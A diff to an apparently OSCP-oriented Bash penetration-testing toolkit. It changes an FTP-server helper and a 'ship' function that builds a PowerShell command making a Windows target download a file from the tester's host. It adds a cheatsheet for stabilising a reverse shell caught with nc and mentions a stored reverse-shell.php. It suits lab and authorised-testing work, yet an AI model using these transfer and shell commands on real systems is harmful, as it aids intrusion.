@@ -190,13 +190,12 @@ function svc() {
             logger info "[i] start ftp server on host"
             logger info "[i] usage:"
             logger info "[i] (1) run ftp"
-            i
-            logger info "[i] (2) run open <ip> 2121"
+            logger info "[i] (2) run open <ip> 21"
             logger info "[i] (2-2) Default Interface ($DEFAULT_NETWORK_INTERFACE) IP: $(get_default_network_interface_ip)"
             logger info "[i] (3) use username anonymous"
             logger info "[i] (4) binary # use binary mode"
             logger info "[i] (5) put <file-you-want-to-download>"
-            python -m pyftpdlib -w
+            python3 -m pyftpdlib -w -p 21
             ;;
         http)
             logger info "[i] start http server"
@@ -337,7 +336,7 @@ function ship() {
         autoHost
 
     elif [[ "$type" == "windows" ]]; then
-        local cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(get_default_network_interface_ip)/$filename' -OutFile \$env:TEMP\\$filename\""
+        local cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(get_default_network_interface_ip)/$filename' -OutFile C:/ProgramData/$filename\""
         logger info "[i] Windows type selected. wget command ready."
         logger info "[i] $cmd"
 
@@ -861,7 +860,7 @@ function host_public_ip() {
 #   Show all utils in the utils directory with customized description.
 #   When a file has a corresponding markdown file with the same name under the same 
 #   directory, the description will be shown. (Only the first line of the markdown file)
-# Usage: show_utils [directory] (default: $HOME/oscp-swiss/utils)
+# Usage: list_utils [directory] (default: $HOME/oscp-swiss/utils)
 # Example:
 # you have a frequent-used reverse-shell under $HOME/oscp-swiss/utils/reverse-shell.php
 # and you have a description file $HOME/oscp-swiss/utils/reverse-shell.php.md
@@ -869,12 +868,12 @@ function host_public_ip() {
 # ```md
 # (make sure to change the IP and port before using it.)
 # ```
-# When you run show_utils, the description will be shown like:
+# When you run list_utils, the description will be shown like:
 #   /home/dex/oscp-swiss/utils
 #   ├── reverse-shell.php (make sure to change the IP and port before using it.)
 #   ├── ...
 #   └── other-utils
-function show_utils() {
+function list_utils() {
     # Check if a directory is provided; if not, use the current directory
     local dir="${1:-$HOME/oscp-swiss/utils}"
 
@@ -894,11 +893,11 @@ function show_utils() {
 }
 
 # Description:
-#   Combo of show_utils. This will show a file's description if it has a corresponding markdown file.
+#   Combo of list_utils. This will show a file's description if it has a corresponding markdown file.
 # Usage: explain <file_or_directory>
 function explain() {
     if [[ -z "$1" ]]; then
-        echo "Usage: explain <file_or_directory>"
+        logger info "Usage: explain <file_or_directory>"
         return 1
     fi
 
@@ -909,8 +908,62 @@ function explain() {
     if [[ -f "$desc_file" ]]; then
         cat "$desc_file"
     else
-        echo "No description file found for $target."
+        logger warn "No description file found for $target."
     fi
+}
+
+# TODO: Doc
+function make_alias() {
+    local file_path="$1"
+    local name="$2"
+    
+    if [ ! -f "$file_path" ]; then
+        logger warn "The file path $file_path does not exist."
+        return 1
+    fi
+
+
+    echo "alias $name='$file_path'" >> "$HOME/oscp-swiss/script/alias.sh"
+
+    logger info "[i] Alias $name for $file_path has been added."
+}
+
+# TODO: Doc
+function cheatsheet() {
+
+    _helper() {
+        logger info "[i] Usage cheatsheet <cheatsheet name>"
+        logger info "[i] Current cheatsheet: <tty>"
+    }
+
+    local cheatsheet=""
+    case "$1" in
+            tty)
+                output="$2"
+                cat <<'EOF'
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+(inside the nc session) CTRL+Z;
+
+# stty -a to get rows and cols
+stty raw -echo; fg;
+
+clear;export SHELL=/bin/bash;export TERM=xterm-256color;stty rows 60 columns 160;reset
+
+# color-ref: https://ivanitlearning.wordpress.com/2020/03/25/adding-colour-to-linux-tty-shells/
+# only works in bash. if facing Garbled, try go into bash 
+export LS_OPTIONS='--color=auto'; eval "`dircolors`"; alias ls='ls $LS_OPTIONS'; export PS1='\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w\$\[\033[00m\] '
+
+# If facing garbled, use:
+PS1="# "
+EOF
+                ;;
+            *)
+                _helper
+                return 1
+                ;;
+        esac    
 }
 
 spawn_session_in_workspace
